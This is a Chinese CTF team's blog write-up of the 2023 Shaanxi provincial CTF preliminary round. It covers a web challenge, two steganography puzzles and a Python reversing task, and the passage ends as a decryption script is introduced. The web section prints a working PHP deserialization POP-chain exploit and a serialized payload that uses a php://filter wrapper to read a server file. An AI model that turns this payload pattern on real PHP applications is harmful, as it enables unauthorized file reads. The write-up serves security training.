@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 5.4.2">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hackerone-32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hackerone-16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="msvalidate.01" content="237E6FD4C952815B9A0DDB67FAB1FF12">
+  <meta name="baidu-site-verification" content="code-LhZrqnckkC">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha256-DfWjNxDkM94fVBWx1H5BMMp0Zq7luBlV8QRcSES7s+0=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"r30blogs.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.12.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="排名战队名称：R3ape1 排名：44  解题思路WEBezpopjs文件中找到路径   EXP： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023陕西省CTF初赛">
+<meta property="og:url" content="https://r30blogs.com/2023/06/05/2023%E9%99%95%E8%A5%BF%E7%9C%81CTF%E5%88%9D%E8%B5%9B/index.html">
+<meta property="og:site_name" content="R3ape1团队笔记">
+<meta property="og:description" content="排名战队名称：R3ape1 排名：44  解题思路WEBezpopjs文件中找到路径   EXP： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102900.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102904.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102912.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102911.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102914.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102913.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102191.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102356.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102439.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102471.jpg">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102506.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102570.gif">
+<meta property="og:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102602.gif">
+<meta property="article:published_time" content="2023-06-05T13:13:00.000Z">
+<meta property="article:modified_time" content="2023-06-05T13:13:09.534Z">
+<meta property="article:author" content="nnnpc、commit、Eureka">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="misc">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="re">
+<meta property="article:tag" content="crypto">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102900.gif">
+
+
+<link rel="canonical" href="https://r30blogs.com/2023/06/05/2023%E9%99%95%E8%A5%BF%E7%9C%81CTF%E5%88%9D%E8%B5%9B/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://r30blogs.com/2023/06/05/2023%E9%99%95%E8%A5%BF%E7%9C%81CTF%E5%88%9D%E8%B5%9B/","path":"2023/06/05/2023陕西省CTF初赛/","title":"2023陕西省CTF初赛"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>2023陕西省CTF初赛 | R3ape1团队笔记</title>
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">R3ape1团队笔记</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">杭电信工笃行楼230实验室</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8E%92%E5%90%8D"><span class="nav-number">1.</span> <span class="nav-text">排名</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">2.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ezpop"><span class="nav-number">2.1.1.</span> <span class="nav-text">ezpop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">2.2.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E6%98%AF%E9%9B%AA%E5%95%8A%E9%A3%98%E8%BF%9B%E5%8F%8C%E7%9C%BC"><span class="nav-number">2.2.1.</span> <span class="nav-text">可是雪啊飘进双眼</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%A1%E9%81%93"><span class="nav-number">2.2.2.</span> <span class="nav-text">管道</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REVERSE"><span class="nav-number">2.3.</span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babypython"><span class="nav-number">2.3.1.</span> <span class="nav-text">babypython</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">2.4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HaM3"><span class="nav-number">2.4.1.</span> <span class="nav-text">HaM3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A5%87%E6%80%AA%E7%9A%84sar"><span class="nav-number">2.4.2.</span> <span class="nav-text">奇怪的sar</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">2.5.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%99%95%E8%A5%BF%E6%B8%B8%E7%8E%A9"><span class="nav-number">2.5.1.</span> <span class="nav-text">陕西游玩</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#eazy-printf"><span class="nav-number">2.5.2.</span> <span class="nav-text">eazy_printf</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="nnnpc、commit、Eureka"
+      src="/images/head.png">
+  <p class="site-author-name" itemprop="name">nnnpc、commit、Eureka</p>
+  <div class="site-description" itemprop="description">网络信息安全，责任重大，使命光荣。</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="mailto:1695672857@qq.com" title="E-Mail → mailto:1695672857@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://r30blogs.com/2023/06/05/2023%E9%99%95%E8%A5%BF%E7%9C%81CTF%E5%88%9D%E8%B5%9B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/head.png">
+      <meta itemprop="name" content="nnnpc、commit、Eureka">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R3ape1团队笔记">
+      <meta itemprop="description" content="网络信息安全，责任重大，使命光荣。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="2023陕西省CTF初赛 | R3ape1团队笔记">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2023陕西省CTF初赛
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2023-06-05 21:13:00 / 修改时间：21:13:09" itemprop="dateCreated datePublished" datetime="2023-06-05T21:13:00+08:00">2023-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%AF%94%E8%B5%9B/" itemprop="url" rel="index"><span itemprop="name">比赛</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><p>战队名称：R3ape1</p>
+<p>排名：44</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102900.gif" alt="图片"></p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>js文件中找到路径</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102904.jpg" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102912.gif" alt="图片"></p>
+<p><strong>EXP：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">night</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$night</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;night . <span class="string">&#x27;哒咩哟&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">day</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$day</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">go</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;day-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">light</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$light</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;light-&gt;<span class="title function_ invoke__">d</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dark</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$dark</span>;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">go</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    (<span class="variable language_">$this</span>-&gt;dark)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="title function_ invoke__">hacked</span>(<span class="variable">$this</span>-&gt;dark));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hacked</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="number">0</span>,<span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;呆jio步&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\.\.*/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$s</span>);</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$s</span>, ENT_QUOTES, <span class="string">&#x27;UTF-8&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$pop</span> = <span class="keyword">new</span> <span class="title function_ invoke__">night</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night = <span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night-&gt;day = <span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night-&gt;day-&gt;dark=<span class="keyword">new</span> <span class="title function_ invoke__">light</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night-&gt;day-&gt;dark-&gt;light= <span class="keyword">new</span> <span class="title function_ invoke__">day</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day=<span class="keyword">new</span> <span class="title function_ invoke__">dark</span>();</span><br><span class="line"><span class="variable">$pop</span>-&gt;night-&gt;day-&gt;dark-&gt;light-&gt;day-&gt;dark=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>;</span><br><span class="line"><span class="variable">$pop1</span> =<span class="keyword">array</span>(<span class="variable">$pop</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$pop1</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行出payload，这里有个关键的点</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102911.jpg" alt="图片"></p>
+<p>看似是赋值给pop，但是复制到vscode中查看发现</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102914.jpg" alt="图片"></p>
+<p>post传参的其实是上面这一串</p>
+<p>把不可见字符这个整体当参数，然后赋刚刚的payload</p>
+<p>⁦快给我传参⁩⁦pop&#x3D;a:2:{i:0;O:5:”night”:1:{s:5:”night”;O:3:”day”:1:{s:3:”day”;O:4:”dark”:1:{s:4:”dark”;O:5:”light”:1:{s:5:”light”;O:3:”day”:1:{s:3:”day”;O:4:”dark”:1:{s:4:”dark”;s:61:”php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag”;}}}}}}i:0;N;}</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102913.gif" alt="图片"></p>
+<p>得到base64编码，解码得到flag</p>
+<p><strong>flag{2e78db056848cd8dfa7ee4f4673ba25f}</strong></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h3><p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102191.gif" alt="图片"></p>
+<p>得到一个文件夹和一个加密压缩包</p>
+<p>passwd中hint.wav末尾有摩斯密码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102356.gif" alt="图片"></p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102439.jpg" alt="图片">解码得到WOAISHANXI，猜测为snow.txt的密码</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102471.jpg" alt="图片"></p>
+<p>得到压缩包密码shanxiroujiamo</p>
+<p>在key.jpg末尾看到还有一张图片，binwalk分离得到2.jpg</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102506.gif" alt="图片"></p>
+<p>对照key.jpg得到hide.jpg的密码：BC1PVEYD</p>
+<p>hide.jpg用该密码进行steghide解密得到flag</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102570.gif" alt="图片"></p>
+<p><strong>flag{d2d2835882495f4e39ecce6847e78f86}</strong></p>
+<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>zsteg一把梭</p>
+<p><img src="https://picture-1312228068.cos.ap-shanghai.myqcloud.com/202306052102602.gif" alt="图片"></p>
+<p><strong>flag{0988f2a657d8936a76876d4f39f7d7a0}</strong></p>
+<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="babypython"><a href="#babypython" class="headerlink" title="babypython"></a>babypython</h3><p>手撕进行换源成python代码，大致是这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;=1nb0A3b7AUQwB3b84mQ/E0MvJUb+EXbx5TQwF3bt52bAZncsd9c&#x27;</span></span><br><span class="line">value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">output = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">temp = flag[i]</span><br><span class="line">temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) ^ <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i != <span class="built_in">len</span>(flag):</span><br><span class="line">  value += temp</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">  temp = value[i]</span><br><span class="line">  temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) + <span class="number">3</span>)</span><br><span class="line">   output += temp</span><br><span class="line"></span><br><span class="line">result = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>] * <span class="number">10</span></span><br><span class="line">invalid_list = [] <span class="comment"># 空列表</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">  result += <span class="string">&#x27;A&#x27;</span></span><br><span class="line">  invalid_list.append(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">  temp = output[i]</span><br><span class="line">  temp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(temp) - <span class="number">1</span>)</span><br><span class="line">  temp = <span class="built_in">ord</span>(temp) // <span class="number">2</span></span><br><span class="line">  output_list.append(temp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一个循环：循环体内的操作</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">  result += output.lower()</span><br><span class="line"></span><br><span class="line">obfuscated_output = base64.b64encode(output.encode()).decode()[::-<span class="number">1</span>][:-<span class="number">1</span>]</span><br><span class="line">obfuscated_output = obfuscated_output.replace(<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;1&#x27;</span>).replace(<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;3&#x27;</span>).replace(<span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">invalid_variable = <span class="built_in">len</span>(obfuscated_output) * <span class="number">5</span></span><br><span class="line"><span class="built_in">print</span>(obfuscated_output)</span><br></pre></td></tr></table></figure>
+
+<p>再根据encode写出解密脚本</p>
